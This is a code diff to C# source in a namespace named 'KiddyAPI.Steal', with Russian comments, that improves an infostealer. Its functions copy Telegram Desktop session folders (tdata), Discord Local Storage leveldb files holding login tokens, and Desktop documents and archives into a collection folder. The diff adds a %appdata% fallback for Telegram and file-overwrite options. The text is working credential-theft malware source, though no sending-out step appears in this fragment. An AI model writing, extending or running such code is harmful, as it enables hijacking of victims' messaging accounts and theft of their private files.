@@ -16,6 +16,7 @@ namespace KiddyAPI.Steal
         public static class Telegram
         {
             private static bool inDir = false;
+
             /// <summary>
             /// Получаем файлы сессии телеграмма
             /// </summary>
@@ -25,11 +26,19 @@ namespace KiddyAPI.Steal
                 var processName = "Telegram";
                 var getProcByName = Process.GetProcessesByName(processName);
                 if (getProcByName.Length < 1)
-                    return;
-                var dirTelegram = System.IO.Path.GetDirectoryName(getProcByName[0].MainModule.FileName);
-                var replace = dirTelegram.Replace("Telegram.exe", "") + @"\tdata";
-                CopyAll(replace, pathToCopy);
+                {
+                    string tPath = Environment.ExpandEnvironmentVariables("%appdata%") +
+                                         @"\Telegram Desktop\tdata";
+                    CopyAll(tPath, pathToCopy + "\\Telegram");
+                }
+                else
+                {
+                    var dirTelegram = System.IO.Path.GetDirectoryName(getProcByName[0].MainModule.FileName);
+                    var replace = dirTelegram.Replace("Telegram.exe", "") + @"\tdata";
+                    CopyAll(replace, pathToCopy + "\\Telegram\\");
+                }
             }
+
             private static void CopyAll(string fromDir, string toDir)
             {
 
@@ -41,6 +50,7 @@ namespace KiddyAPI.Steal
                 foreach (string s in Directory.GetDirectories(fromDir))
                     CopyDir(s, toDir);
             }
+
             // Костыль
             private static void CopyFile(string name, string toDir)
             {
@@ -54,7 +64,9 @@ namespace KiddyAPI.Steal
 
                     File.Copy(name, s2);
                 }
-                catch { }
+                catch
+                {
+                }
             }
 
             //Костыль
@@ -66,31 +78,39 @@ namespace KiddyAPI.Steal
                     CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                     inDir = false;
                 }
-                catch { }
+                catch
+                {
+                }
             }
         }
+
         /// <summary>
         /// Получаем файлы с Рабочего стола
         /// </summary>
         public static class Desktop
         {
             /// <summary>
-            /// Собственно, сам метод
+            /// Метод для получения файлов с Десктопа
             /// </summary>
-            /// <param name="dirToCopy">Директория, куда пойдут файлы</param>
-            /// 
-            public static void Steal(string dirToCopy)
+            /// <param name="dirToCopy">Куда копировать</param>
+            /// <param name="rewrite">Перезапись файлов</param>
+            public static void Steal(string dirToCopy, bool rewrite)
             {
-                foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
+                foreach (FileInfo file in new DirectoryInfo(
+                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                 {
-                    if (file.Extension.Equals(".txt") || file.Extension.Equals(".doc") || file.Extension.Equals(".docx") || file.Extension.Equals(".log") || file.Extension.Equals(".rar") || file.Extension.Equals(".zip"))
+                    if (file.Extension.Equals(".txt") || file.Extension.Equals(".doc") ||
+                        file.Extension.Equals(".docx") || file.Extension.Equals(".log") ||
+                        file.Extension.Equals(".rar") || file.Extension.Equals(".zip"))
                     {
-                        Directory.CreateDirectory(dirToCopy + "\\Desktop\\");
-                        file.CopyTo(dirToCopy + "\\Desktop\\" + file.Name);
+                        if (!(Directory.Exists(dirToCopy + "\\Desktop\\")))
+                            Directory.CreateDirectory(dirToCopy + "\\Desktop\\");
+                        file.CopyTo(dirToCopy + "\\Desktop\\" + file.Name, rewrite);
                     }
                 }
             }
         }
+
         /// <summary>
         /// Дает доступ к сессии Дискорда
         /// </summary>
@@ -99,19 +119,19 @@ namespace KiddyAPI.Steal
             /// <summary>
             /// Забираем файлы сессии
             /// </summary>
-            /// <param name="pathToCopy">Путь, куда копировать файлы</param>
-            public static void Steal(string pathToCopy)
+            /// <param name="pathToCopy">Папку, куда копировать</param>
+            /// <param name="rewrite">Перезапись файлов</param>
+            public static void Steal(string pathToCopy, bool rewrite)
             {
                 string discordPath = Environment.ExpandEnvironmentVariables("%appdata%") +
                                      @"\Discord\Local Storage\leveldb";
-                DirectoryInfo toDir = new DirectoryInfo(pathToCopy + @"\Discord\");
-                if (!Directory.Exists(pathToCopy))
-                    Directory.CreateDirectory(pathToCopy);
-                foreach (string file in Directory.GetFiles(discordPath))
-                    File.Copy(file, Path.Combine(pathToCopy, Path.GetFileName(file)));
+                if (!(Directory.Exists(pathToCopy + "\\Discord\\")))
+                    Directory.CreateDirectory(pathToCopy + @"\\Discord\\");
+                foreach (var files in new DirectoryInfo(discordPath).GetFiles())
+                {
+                    files.CopyTo(pathToCopy + "\\Discord\\" + files.Name, rewrite);
+                }
             }
-
-
         }
     }
 }
